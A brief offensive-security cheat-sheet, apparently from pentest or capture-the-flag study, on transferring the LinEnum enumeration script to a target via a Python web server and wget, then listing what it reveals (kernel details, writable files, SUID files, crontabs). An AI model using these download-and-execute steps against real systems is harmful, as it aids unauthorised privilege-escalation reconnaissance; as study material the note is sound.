					Option 1
-- Attacker:
	-- python3 -m http.server 8000			starts webserver for listening

-- Target:
	-- wget ip:8000/documents/LinEnum.sh	download file on target
	-- chmod +x LinEnum.sh 					makes file executable

					Option 2(less privileges)
-- Attacker:
	--Copy LinEnum code to Target		      (.sh Extension)
	--chmod +x LinEnum.sh				   makes file executable

					LineEnum Output
-- kernal information
-- read/write files
-- suid files
-- crontab contents
